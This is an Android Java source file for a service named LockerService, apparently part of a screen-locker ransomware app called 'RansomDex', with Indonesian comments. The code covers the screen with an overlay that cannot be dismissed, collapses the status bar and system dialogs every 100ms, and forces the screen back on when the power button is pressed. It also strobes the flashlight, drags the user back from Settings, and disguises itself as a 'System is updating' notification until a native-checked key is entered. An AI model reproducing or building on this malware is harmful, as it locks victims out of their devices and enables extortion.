package com.bondex.ransomdex;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraManager;
import android.view.accessibility.AccessibilityManager;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.IBinder;
import android.os.Build;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.os.Handler;
import java.lang.reflect.Method;
import android.content.pm.ServiceInfo;
import android.widget.Button;
import android.widget.EditText;

public class LockerService extends Service {
    private WindowManager windowManager;
    private View lockerLayout;
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isFlashOn = false;
    public static boolean isAuthenticated = false;

    static {
        System.loadLibrary("ransom-native");
    }

    public native void startNativeAggression(String serviceName);
    public native void stopNativeAggression();
    public native boolean verifyAdvancedKey(String input);

    private Handler flashHandler = new Handler();
    private Runnable flashRunnable = new Runnable() {
        @Override
        public void run() {
            toggleFlashlight(!isFlashOn);
            flashHandler.postDelayed(this, 50); // Kedip setiap 50ms
        }
    };

    private BroadcastReceiver screenReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                // Jika user menekan tombol power (layar mati), paksa nyalakan lagi
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "RansomDex:WakeLock");
                wakeLock.acquire(1000);
            }
        }
    };

    private void collapseStatusBar() {
        try {
            Object statusBarService = getSystemService("statusbar");
            Class<?> statusBarManager = Class.forName("android.app.StatusBarManager");
            // Method "collapsePanels" adalah standar untuk menutup status bar via reflection
            Method collapse = statusBarManager.getMethod("collapsePanels");
            collapse.setAccessible(true);
            collapse.invoke(statusBarService);
        } catch (Exception e) {
            // Fallback: Menggunakan intent broadcast (mulai dibatasi di Android 12+)
            sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void startStatusBarLocker() {
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                collapseStatusBar(); // Memanggil method collapsePanels yang sudah kamu buat
                closeSystemDialogs(); // Mengirim ACTION_CLOSE_SYSTEM_DIALOGS
                handler.postDelayed(this, 100); // Cek setiap 100ms
            }
        }, 100);
    }

    private boolean isAccessibilityServiceEnabled() {
        AccessibilityManager am = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);
        java.util.List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        for (AccessibilityServiceInfo enabledService : enabledServices) {
            if (enabledService.getResolveInfo().serviceInfo.packageName.equals(getPackageName())) {
                return true;
            }
        }
        return false;
    }

    // Memaksa MainActivity kembali ke depan jika user berhasil lari ke Settings
    public void forceFront() {
        if (isAuthenticated) return;

        // Jika aksesibilitas mati, panggil MainActivity agar user dipaksa ke Settings.
        // Namun jika sedang AKTIF, kita tarik MainActivity hanya untuk menjaga overlay tetap kuat.
        Intent i = new Intent(this, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                   Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | 
                   Intent.FLAG_ACTIVITY_SINGLE_TOP |
                   Intent.FLAG_ACTIVITY_NO_ANIMATION |
                   Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(i);
    }

    // Menutup menu power, notifikasi, dan dialog sistem lainnya secara instan
    private void closeSystemDialogs() {
        try {
            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);
        } catch (Exception e) {
        }
    }

    private void toggleFlashlight(boolean status) {
        try {
            if (cameraId != null) {
                cameraManager.setTorchMode(cameraId, status);
                isFlashOn = status;
            }
        } catch (Exception e) {}
    }

    private void applyFullScreen() {
        if (lockerLayout == null) return;
        lockerLayout.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_FULLSCREEN
        );
    }

    @Override
    public void onCreate() {
        super.onCreate();

        startInForeground();
        startStatusBarLocker();

        // Inisialisasi Kamera untuk Senter
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String[] ids = cameraManager.getCameraIdList();
            if (ids.length > 0) cameraId = ids[0];
        } catch (Exception e) {}

        // Register receiver untuk deteksi tombol power (layar mati)
        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
        registerReceiver(screenReceiver, filter);

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        lockerLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);

        lockerLayout.setFitsSystemWindows(false);
        // Ubah dari hitam pekat (0xFF000000) ke warna yang lebih soft jika ingin menghindari kesan dark mode paksa
        // Atau tetap hitam jika ini memang untuk ransomware look
        lockerLayout.setBackgroundColor(0xFF000000);

        applyFullScreen();

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | // Render di bawah status bar
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS | // Menembus batas layar (poni/status bar)
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | 
            WindowManager.LayoutParams.FLAG_SPLIT_TOUCH |
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT);

        // Paksa menutupi area Notch (Poni) agar Quick Settings tidak bisa diintip dari pojok
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }
        
        // Memastikan overlay dapat menerima input keyboard untuk password
        params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;

        params.gravity = Gravity.CENTER;
        windowManager.addView(lockerLayout, params);

        // Jalankan mesin C++ yang lebih ganas
        startNativeAggression(getPackageName() + "/.LockerService");
        flashHandler.post(flashRunnable);

        Button btnUnlock = lockerLayout.findViewById(R.id.btnUnlock);
        EditText inputPass = lockerLayout.findViewById(R.id.editPassword);

        btnUnlock.setOnClickListener(v -> {
            // Menggunakan Enkripsi Militer Native Check
            if (verifyAdvancedKey(inputPass.getText().toString().trim())) {
                isAuthenticated = true;
                stopNativeAggression();
                stopSelf();
            }
        });
    }

    private void startInForeground() {
        String CHANNEL_ID = "locker_service_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "System Update",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification notification = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("System is updating")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setPriority(Notification.PRIORITY_MAX)
                    .setOngoing(true)
                    .build();
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        } else {
            startForeground(1, notification);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopNativeAggression();
        flashHandler.removeCallbacks(flashRunnable);
        toggleFlashlight(false);
        unregisterReceiver(screenReceiver);
        if (lockerLayout != null) windowManager.removeView(lockerLayout);
    }
}